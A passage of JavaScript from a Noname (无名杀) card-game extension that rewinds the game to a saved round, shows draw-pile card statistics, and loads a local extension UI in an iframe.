                    node.addEventListener(window.isMobile ? 'touchend' : 'click', function () {
                        if (_event.selected === this) {
                            _event.selected.classList.remove('thundertext')
                            _event.selected = undefined;
                            _event.ok.hide();
                            div.innerHTML = '点击轮数显示预览图';
                            return;
                        }
                        if (_event.selected) _event.selected.classList.remove('thundertext');
                        _event.selected = this;
                        this.classList.add('thundertext');
                        //dialog.replaceChild(this.arena, div);
                        div.innerHTML = '';
                        div.appendChild(this.link.arena);
                        _event.ok.show();
                    });
                    dialog.add(node);
                    node.link = list[i];
                    list[i].i = i;
                }
                dialog.add(ui.create.div('.placeholder'));
                dialog.add(div);
                document.body.appendChild(dialog);

                game.pause();
                game.countChoose();
                'step 1'
                event.ok.parentElement.style.zIndex = undefined;
                if (event.ok) event.ok.close();
                if (event.dialog) event.dialog.close();
                if (event.cancel) event.cancel.close();
                if (event.reuslt.bool) {
                    var historyLinks = event.reuslt.links;

                    ui.cardPile.innerHTML = '';
                    ui.discardPile.innerHTML = '';
                    historyLinks.cardPile.forEach(item => ui.cardPile.appendChild(item));
                    historyLinks.discardPile.forEach(item => ui.discardPile.appendChild(item));

                    function restStatus(current, history) {
                        // 循环可遍历得属性
                        for (let i of Object.keys(current)) {
                            // 如果当时没有这个属性，就给他删掉
                            if (!history.keys.contains(i)) {
                                delete current[i];
                                continue;
                            }
                            // 如果有这个属性，那就加上去
                            if (history[i])
                                current[i] = history[i];
                        }
                        // delete history.keys;

                        if (history.qyState['unseen']) current.classList.add('unseen');
                        else current.classList.remove('unseen');
                        if (history.qyState['unseen2']) current.classList.add('unseen2');
                        else current.classList.remove('unseen2');
                        ['hp', 'maxHp', 'nickname', 'sex', 'group', 'name', 'name1', 'name2',
                            'hujia', 'side', 'identityShown', 'idenity'].forEach(item => current[item] = history.qyState[item]);
                        current.storage._disableJudge = history.qyState['disableJudge'];
                        current.storage.disableEquip = history.qyState['disableEquip'];
                        current.dataset.position = history.qyState['position'];
                        current.node.identity.innerHTML = history.qyState['identityNode'][0];
                        current.node.identity.dataset.color = history.qyState['identityNode'][1];
                        if (history.qyState['mode']) {
                            if (history.qyState['mode'].unseen == true) current.classList.add('unseen');
                            else current.classList.remove('unseen');
                            if (history.qyState['mode'].unseen2 == true) current.classList.add('unseen2');
                            else current.classList.remove('unseen2');
                        }
                        current.updateMarks();
                    }

                    function cardRegion(current, data) {
                        // 先清空牌
                        current.node.handcards1.innerHTML = '';
                        current.node.handcards2.innerHTML = '';
                        current.node.equips.innerHTML = '';
                        current.node.judges.innerHTML = '';

                        if (current.node.expansions)
                            current.node.expansions.innerHTML = '';

                        // 获得手牌
                        current.directgain(data.h);
                        current.directgain(data.s);
                        // 贴上判定牌;
                        data.j.forEach(item => {
                            if (item.viewAs != item.name && item.viewAs) {
                                lib.element.player.addJudge.call(current, {name: item.viewAs}, item)._triggered = null
                            } else {
                                lib.element.player.addJudge.call(current, item, [item])._triggered = null
                            }
                        });
                        // 装上装备牌
                        data.e.forEach(item => {
                            let equipCardArray = data.equipCardArray[item.name];
                            let equipCardStorage = data.equipCardStorage[item.name];
                            if (equipCardArray) {
                                for (let i in equipCardArray)
                                    item[i] = equipCardArray[i];
                            }
                            if (equipCardStorage) {
                                for (let i in equipCardStorage)
                                    item.storage[i] = equipCardStorage[i];
                            }
                            let onEquip = lib.card[item.name].onEquip;
                            if (onEquip) {
                                lib.card[item.name].restEquip = Array.isArray(onEquip) ? onEquip.slice(0) : onEquip;
                                lib.card[item.name].onEquip = function () {
                                    lib.card[card.name].onEquip = lib.card[card.name].restEquip;
                                    delete lib.card[card.name].restEquip;
                                }
                            }
                            lib.element.player.equip.call(current, item)._triggered = null;
                        });
                        //复原武将牌上的牌
                        for (var i = 0; i < data.x.length; i++) {
                            current.addToExpansion(data.x[i], 'nodelay', current).gaintag.addArray(data.gaintag[i])._triggered = null;
                        }
                    }

                    for (let history of event.reuslt.links) {
                        let current = game.playerMap[history.playerid];
                        if (history.qyState['dead']) lib.element.player.die.call(current)._triggered = null;
                        else lib.element.player.revive.call(current, false);
                        lib.element.player.init.call(current, history.qyState['name1'], history.qyState['name2']);
                        var next = lib.element.player.link.call(current, !!history.qyState['linked']);
                        if (next) next._triggered = null;
                        var next = lib.element.player.turnOver.call(current, !!history.qyState['turnedover']);
                        if (next) next._triggered = null;
                        cardRegion(current, history);
                        for (var i = 0; i < current.getCards('hs').length; i++) {
                            current.getCards('hs')[i].gaintag = history.qyState['gaintag'][i];
                        }
                        for (var i = 0; i < current.getCards('j').length; i++) {
                            current.getCards('j')[i].viewAs = history.qyState['views'][i];
                        }
                        restStatus(current, history);
                        current.update();
                        current.updateMarks();
                    }
                    // 恢复之前记录的_status的数组
                    for (let i in historyLinks.statusKeys) {
                        _status[i] = historyLinks.statusKeys[i];
                    }
                    game.arrangePlayers();
                    lib.hook = historyLinks.hook;
                    lib.hookmap = historyLinks.hookmap;

                    game.roundNumber = historyLinks.roundNumber - 1;
                    game.phaseNumber = historyLinks.phaseNumber;
                    game.updateRoundNumber();
                    if (game.getState) game.updateState(historyLinks.qyGetState);
                } else event.finish()
                'step 2'
                var historyLinks = event.reuslt.links;
                while (_status.event.name != 'phaseLoop') {
                    _status.event = _status.event.parent;
                }
                _status.event.step = 0
                _status.event.player = historyLinks.roundStart;
                _status.paused = false;
                _status.roundStart = historyLinks.roundStart;
                window.qingyao_history.length = historyLinks.i;
            },
        };
        lib.translate['_ymlunhun'] = '轮回';
        lib.translate['_ymfuyuan'] = '复原';
        if (config.qingyao_cundang === 'button') {
            delete lib.skill._ymfuyuan.enable;
        }
    }
    // 统计牌堆
    if (config.qingyao_card_statistics) {
        lib.qyArenaReadyPushOrRunStart(function () {
            ui.create.system('统计牌堆', function () {
                if (!_status.gameStarted) return;
                game.pause2();

                const cardsInfo = game.players.map(item => item.get('h')).flat(window.Infinity)
                    .concat(...ui.cardPile.childNodes)
                    .concat(...ui.discardPile.childNodes)
                    .map(item => ({
                        name: item.name,
                        suit: item.suit,
                        number: item.number,
                        nature: get.translation(item.nature),
                        color: get.color(item),
                        type: get.translation(get.type(item), 'trick'),
                        translate: lib.translate[item.name],
                        link: item,
                    }));
                let cardStatistics = {
                    杀: {
                        num: 0,
                        type: '基本',
                    },
                    火杀: {
                        num: 0,
                        type: '基本',
                    },
                    雷杀: {
                        num: 0,
                        type: '基本',
                    },
                    红杀: {
                        num: 0,
                        type: '基本',
                    },
                    黑杀: {
                        num: 0,
                        type: '基本',
                    },
                    '黑桃2~9': {
                        num: 0,
                        type: '花色',
                    },
                }
                let typeList = ['点数', '花色'];
                for (let card of cardsInfo) {
                    typeList.add(card.type);
                    // 统计卡牌名
                    if (!cardStatistics[card.translate])
                        cardStatistics[card.translate] = {
                            num: 0,
                            type: card.type,
                        }
                    // 统计花色
                    if (!cardStatistics[get.translation(card.suit)])
                        cardStatistics[get.translation(card.suit)] = {
                            num: 0,
                            type: '花色',
                        }
                    // 统计点数
                    if (!cardStatistics[card.number])
                        cardStatistics[card.number] = {
                            num: 0,
                            type: '点数',
                        }

                    if (ui.cardPile.contains(card.link)) {
                        cardStatistics[card.translate].num++;
                        cardStatistics[get.translation(card.suit)].num++;
                        cardStatistics[card.number].num++;

                        if (card.name === 'sha') {
                            if (card.color === 'black') {
                                cardStatistics['黑杀'].num++;
                                if (card.suit === 'spade' && card.number <= 9 && card.number >= 2) cardStatistics['黑桃2~9'].num++;
                            } else if (card.color === 'red') {
                                cardStatistics['红杀'].num++;
                            }
                        }

                    }


                    if (card.nature) {
                        if (!cardStatistics[card.nature + card.translate])
                            cardStatistics[card.nature + card.translate] = {
                                num: 0,
                                type: card.type,
                            }
                        if (ui.cardPile.contains(card.link)) {
                            cardStatistics[card.nature + card.translate].num++;
                        }
                    }
                }

                let popupContainer = ui.create.div('.popup-container', ui.window, {
                    zIndex: 10,
                    background: 'rgb(0,0,0,.3)',
                }, function () {
                    this.delete(500);
                    game.resume2();
                });
                let statistics = ui.create.div('.card-statistics', '卡牌计数器', popupContainer);
                let statisticsTitle = ui.create.div('.card-statistics-title', statistics);
                let statisticsContent = ui.create.div('.card-statistics-content', statistics);

                typeList.forEach(item => {
                    ui.create.div(statisticsTitle, '', item);
                    statisticsContent[item] = ui.create.div(statisticsContent, '');
                });

                for (let i in cardStatistics) {
                    let items = ui.create.div('.items');
                    let item = ui.create.div('.item', i, items);
                    let num = ui.create.div('.item-num', `X${cardStatistics[i].num}`, items);
                    statisticsContent[cardStatistics[i].type].appendChild(items);
                }

            }, true, true);
        })
    }

    lib.qyArenaReadyPushOrRunStart(() => {
        const globalSkills = ['_qyshousha_jisha', '_qyshousha_jisha2', '_qy_ChangeHp', '_qy_deleteother', '_qy_onDead', '_qy_chongzhu', '_qingyao_shoupaikeshi', '_qingyao_guanfangshili', '_qingyao_AIxuanjiang', '_qingyao_kongzhiduiyou', '_qyPlayerAnimateFilterUse', '_qyCustomAnimationList', '_ymlunhun'];
        for (let globalSkill of globalSkills) {
            game.qyAddGlobalSkill(globalSkill);
        }
    });
})


window.qyCachesMainWindow = {
    src: 'extension/清瑶葭绮/members/假装无敌/dist/index.html?openRouter=',
    // src: '/Users/noname/假装无敌UI/dist/index.html',
    mainWindow: null,
    /**
     * @param {number} index 0:包裹的div,1:iframe,2:iframe.contentWindow
     * @returns {*}
     */
    getMain(index = 0) {
        if (!this.mainWindow) this.mainWindow = this.open(this.src);
        return this.mainWindow[index];
    },
    // 缓存加载
    open(src = this.src) {
        let div = document.createElement('div');
        let divStyle = {
            'z-index': 100,
            'background': 'white',
            'width': '100%',
            'height': '100%',
            'position': 'fixed',
            'left': '0px',
            'top': '0px',
        };
        Object.assign(div.style, divStyle);
        div.hide();
        document.body.appendChild(div);

        let iframe = document.createElement('iframe');
        let frameElementStyle = {
            width: '100%',
            height: '100%',
            left: '0px',
            top: '0px',
            position: 'fixed',
            border: 'none',
        }
        Object.assign(iframe.style, frameElementStyle);
        div.appendChild(iframe);

        const noname_inited = localStorage.getItem('noname_inited');
        let assetURL = '';
        if (noname_inited && noname_inited !== 'nodejs') {
            assetURL = noname_inited;
        }
        iframe.src = `${assetURL}${src}`;
        let divElement = document.createElement('div');
        divElement.style.cssText = `position: fixed; display: flex; justify-content: center; align-items: center; width: 40px; height: 40px; border-radius: 100%; font-size: 36px; line-height: 40px; font-family: xinwei; bottom: 2px; right: 2px; background: rgba(0, 0, 0, 0.4); color: white; text-shadow: rgba(0, 0, 0, 0.5) 0px 0px 2px; box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 0px 1px, rgba(0, 0, 0, 0.3) 0px 3px 10px; padding: 5px; cursor: pointer;`
        divElement.textContent = '隐';
        divElement.onclick = () => div.hide();
        div.appendChild(divElement);
        return [div, iframe, iframe.contentWindow];
    },
    show() {
        // 自己给自己通信，哈哈哈
        window.postMessage({
            type: 'requestGlobalParameter'
        }, "*");
        return this.getMain().show();
    },
    hide() {
        return this.getMain().hide();
    },
    postMessage(data) {
        this.getMain(2).postMessage(data, "*");
    },
}

setTimeout(() => {
    window.qyCachesMainWindow.getMain();
}, 2000);

